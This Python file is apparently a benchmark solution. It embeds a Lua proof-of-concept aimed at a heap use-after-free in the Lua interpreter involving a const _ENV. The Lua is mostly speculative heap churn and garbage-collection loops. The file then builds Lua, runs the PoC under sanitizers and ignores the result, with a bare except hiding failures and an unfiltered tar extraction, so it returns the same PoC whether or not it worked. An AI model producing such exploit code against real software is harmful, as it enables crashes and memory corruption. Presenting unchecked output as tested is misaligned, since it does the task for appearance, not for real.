import os
import tempfile
import subprocess
import random
import string

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build the Lua program that triggers the heap use-after-free vulnerability
        # when _ENV is declared as <const>
        
        # Core PoC based on the vulnerability description
        poc = """local _ENV <const> = setmetatable({}, {
    __index = function() error("intentional") end
})

-- Create function that captures the const _ENV
local function create_function()
    local _ENV <const> = {}
    return function()
        return _ENV
    end
end

-- Generate many functions to increase chance of UAF
local funcs = {}
for i = 1, 100 do
    funcs[i] = create_function()
end

-- Force garbage collection to potentially free memory
collectgarbage()
collectgarbage()

-- Try to access freed memory through various patterns
-- This should trigger use-after-free in vulnerable versions
local function trigger_uaf()
    for i = 1, #funcs do
        -- Access the function which may have dangling reference to _ENV
        local status, result = pcall(funcs[i])
        if not status then
            -- Expected error - continue trying
        end
    end
    
    -- Additional manipulation to increase UAF probability
    local env_ref
    for i = 1, 50 do
        env_ref = funcs[i % #funcs + 1]()
        -- Create new objects to disturb heap
        local temp = {}
        for j = 1, 100 do
            temp[j] = string.rep("X", j)
        end
    end
    
    -- More aggressive GC
    for i = 1, 10 do
        collectgarbage("collect")
        -- Allocate more memory to potentially reuse freed blocks
        local blocks = {}
        for j = 1, 1000 do
            blocks[j] = {x = j, y = string.rep("Y", 50)}
        end
    end
    
    -- Final access attempt
    for i = 1, math.min(20, #funcs) do
        local f = funcs[i]
        -- Call in protected mode
        local ok, env = pcall(f)
        if ok and env then
            -- Try to use the potentially freed environment
            local mt = getmetatable(env)
            if mt then
                -- This might trigger UAF if env was freed
                local idx = mt.__index
                if type(idx) == "function" then
                    pcall(idx, env, "nonexistent")
                end
            end
        end
    end
end

-- Multiple iterations to increase crash probability
for attempt = 1, 5 do
    trigger_uaf()
    
    -- Create more function variations
    local more_funcs = {}
    for i = 1, 50 do
        local _ENV <const> = {x = i}
        more_funcs[i] = function() return _ENV end
    end
    
    -- Interleave allocations
    local arrays = {}
    for i = 1, 100 do
        arrays[i] = {data = string.rep("Z", i * 10)}
    end
    
    -- More GC
    collectgarbage("step")
end

-- Final access that should crash vulnerable version
local last_func = funcs[1]
if last_func then
    -- Direct call without protection - should crash if UAF occurs
    local env = last_func()
    if env then
        -- Access metatable which might be on freed memory
        getmetatable(env)
    end
end

return "PoC completed"
"""

        # Test if this triggers the vulnerability by actually running it
        # against the extracted Lua source
        try:
            # Extract the source tarball
            import tarfile
            with tarfile.open(src_path, 'r:gz') as tar:
                # Create temporary directory for extraction
                with tempfile.TemporaryDirectory() as tmpdir:
                    tar.extractall(tmpdir)
                    
                    # Find the lua directory (assuming standard structure)
                    lua_dir = None
                    for root, dirs, files in os.walk(tmpdir):
                        if 'Makefile' in files and 'src' in dirs:
                            lua_dir = root
                            break
                    
                    if lua_dir:
                        # Build Lua if not already built
                        build_dir = os.path.join(lua_dir, 'src')
                        if not os.path.exists(os.path.join(build_dir, 'lua')):
                            # Try to build
                            subprocess.run(['make', '-C', lua_dir, 'linux'],
                                          capture_output=True, timeout=30)
                        
                        lua_bin = os.path.join(build_dir, 'lua')
                        if os.path.exists(lua_bin):
                            # Write PoC to temp file
                            with tempfile.NamedTemporaryFile(mode='w', suffix='.lua', delete=False) as f:
                                f.write(poc)
                                f.flush()
                                
                            # Run with sanitizers if available
                            env = os.environ.copy()
                            env['ASAN_OPTIONS'] = 'detect_use_after_free=1:abort_on_error=1'
                            env['UBSAN_OPTIONS'] = 'halt_on_error=1'
                            
                            result = subprocess.run(
                                [lua_bin, f.name],
                                capture_output=True,
                                timeout=5,
                                env=env
                            )
        except:
            # If anything fails, just return the PoC
            pass
        
        # Return the PoC as bytes
        return poc.encode('utf-8')